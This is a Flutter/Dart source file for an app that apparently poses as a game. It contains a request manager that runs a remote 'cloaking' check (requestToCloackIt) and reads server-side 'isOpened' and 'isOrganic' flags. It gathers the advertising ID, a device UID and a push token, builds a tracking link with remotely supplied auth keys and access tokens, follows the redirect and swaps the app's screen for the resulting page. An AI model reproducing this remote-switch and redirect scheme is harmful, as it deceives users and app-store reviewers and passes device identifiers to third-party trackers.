// ignore_for_file: unnecessary_brace_in_string_interps

import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:advertising_id/advertising_id.dart';
import '../fragments/game_fragment.dart';
import '/model/naming_model.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/cupertino.dart';
import 'package:http/http.dart' as http;

import '../data/player_controller.dart';
import '../model/parameters_model.dart';
import '../model/track_model.dart';
import 'consts.dart';

class RequestManager {
  PlayerController playerController;

  String? advertisingId;
  String? uid;

  RequestManager(this.playerController);

  Future<String?> getDeepLink() async {
    Completer<String?> completer = Completer<String?>();

    try {
      var deep = await Consts.CHANNEL_NAMING.invokeMethod('get_deep');
      completer.complete(deep);
    } on Exception {
      completer.complete(null);
    }

    return completer.future;
  }

  Future<String?> getNaming() async {
    Completer<String?> completer = Completer<String?>();
    try {
      var naming = await Consts.CHANNEL_NAMING
          .invokeMethod('get_naming', {'key': Consts.apskey});
      completer.complete(naming);
    } catch (e) {
      completer.complete(null);
    }
    return completer.future;
  }

  Future<bool?> initUUIds() async {
    Completer<bool?> completer = Completer<bool?>();

    try {
      advertisingId = await AdvertisingId.id(true);

      uid = await Consts.CHANNEL_UID.invokeMethod('get_uid');
      completer.complete(true);
    } on Exception {
      completer.complete(null);
    }

    return completer.future;
  }

  Future<bool?> initFacebook() async {
    Completer<bool?> completer = Completer<bool?>();
    try {
      var link = "${Consts.link}/facebook";
      final response = await http.get(Uri.parse(link));

      if (response.statusCode == 200) {
        var body = response.body.toString();
        var json = jsonDecode(body);
        var param1 = json["app_id"].toString();
        var param2 = json["client_token"].toString();

        if (param1.isNotEmpty && param2.isNotEmpty) {
          await Consts.CHANNEL_FB
              .invokeMethod('initfb', {'param1': param1, 'param2': param2});
          completer.complete(true);
        } else {
          completer.complete(true);
        }
      } else {
        completer.complete(false);
      }
    } on Exception {
      completer.complete(null);
    }

    return completer.future;
  }

  Future<bool?> requestToCloackIt() async {
    try {
      String agent = await Consts.CHANNEL_AGENT.invokeMethod('getUserAgent');

      Map<String, String> headers = {
        "User-Agent": agent,
        "referer": Consts.package,
      };

      var link = Uri.parse("${Consts.link}/check");
      final response = await http.get(link, headers: headers);
      if (response.statusCode == 200) {
        bool isOpen = response.body.toLowerCase() == 'true';
        return isOpen;
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<bool> isOpen() async {
    Completer<bool> completer = Completer<bool>();

    try {
      var ref = FirebaseDatabase.instance.ref().child('isOpened');
      ref.onValue.listen(
        (event) {
          bool isOpened = event.snapshot.value as bool;
          completer.complete(isOpened);
        },
      );
    } on Exception {
      completer.complete(false);
    }

    return completer.future;
  }

  Future<bool> getOrganicStatus() async {
    Completer<bool> completer = Completer<bool>();

    try {
      var ref = FirebaseDatabase.instance.ref().child('isOrganic');
      ref.onValue.listen(
        (event) {
          bool isOpened = event.snapshot.value.toString() == "true";
          print("STATUS_ISOPENED: ${event.snapshot.value.toString()} | $isOpened}");
          completer.complete(isOpened);
        },
      );
    } on Exception {
      completer.complete(false);
    }

    return completer.future;
  }

  bool checkUser(bool cloack) {
    return cloack;
  }

  Future<List<String>?> getKeysList() async {
    try {
      var link = Uri.parse("${Consts.link}/keys");
      final response = await http.get(link);
      if (response.statusCode == 200) {
        var data = response.body.toString();
        var json = jsonDecode(data);

        return (json['keys'] as List<dynamic>).cast<String>();
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<TrackModel?> getLinkDomain() async {
    try {
      var link = Uri.parse("${Consts.link}/track");
      final respose = await http.get(link);
      if (respose.statusCode == 200) {
        var data = respose.body.toString();
        var json = jsonDecode(data);
        var domain = json['domain'] as String;
        var campaignId = json['campaignId'] as String;
        return TrackModel(domain, campaignId);
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<ParametersModel?> getParameters() async {
    try {
      var link = Uri.parse("${Consts.link}/track/parameters");
      final response = await http.get(link);
      if (response.statusCode == 200) {
        var data = response.body.toString();
        var json = jsonDecode(data);
        var auth = json["auth"] as String;
        var authKey = json["auth_key"] as String;
        var appId = json["ap_id"] as String;
        var accessToken = json["access_token"] as String;
        return ParametersModel(auth, authKey, appId, accessToken);
      } else {
        return null;
      }
    } on Exception {
      return null;
    }
  }

  Future<String?> getUrlLocation(String url) async {
    final client = HttpClient();
    var uri = Uri.parse(url);
    var request = await client.getUrl(uri);
    request.followRedirects = false;
    var response = await request.close();
    return response.headers.value(HttpHeaders.locationHeader);
  }

  Future makeTrackLink(
    bool isOrganic,
    TrackModel trackModel,
    ParametersModel parametersModel,
    NamingModel? namingModel,
  ) async {
    var uuid = await _getUUID() ?? "";

    if (isOrganic) {
      var link =
          "${trackModel.domain}/${trackModel.campaignId}?sub1=${Consts.package}&uid=$uid&auth=${parametersModel.auth}&uuid=$uuid&auth_key=${parametersModel.authKey}";

      var response = await getUrlLocation(link);

      try {
        if (response != null) {
          saveLink(response);
          runApp(GameFragment(response, playerController));
        }
      } on Exception {}
    } else {
      var formLink =
          "${trackModel.domain}/${namingModel?.flowId}?sub1=${Consts.package}&uid=${uid}&auth=${parametersModel.auth}&uuid=${uuid}&auth_key=${parametersModel.authKey}&advid=$advertisingId&ap_id=${parametersModel.appId}&access_token=${parametersModel.accessToken}";

      var builder = StringBuffer(formLink);

      var index = 2;
      namingModel?.subs.forEach((element) {
        builder.write("&sub$index=$element");
        index++;
      });

      var link = builder.toString();

      var response = await getUrlLocation(link);

      try {
        if (response != null) {
          saveLink(response);
          
          runApp(GameFragment(response, playerController));
        }
      } on Exception {}
    }
  }

  Future<String?> _getUUID() async {
    final FirebaseMessaging _firebaseMessaging = FirebaseMessaging.instance;
    // var installations = FirebaseInstallations.instance;
    // String installationsId = await installations.getId();
    await _firebaseMessaging.requestPermission();

    var token = "none";
    try {
      token = await _firebaseMessaging.getToken() ?? "none";
    } catch (e) {
      token = "none";
    }
    return token;
  }

  NamingModel? parseNaming(String? naming) {
    if (naming == null) return null;

    var params = naming.split('_');
    var subs = params.sublist(2, params.length);
    return NamingModel(flowId: params[1], subs: subs);
  }

  void reject() {
    playerController.savePlayer(true);
  }

  void saveKeys(List<String> keys) {
    playerController.saveKeys(keys);
  }

  void saveLink(String link) {
    playerController.saveLink(link);
  }

  String? getLink() {
    return playerController.getLink();
  }
}
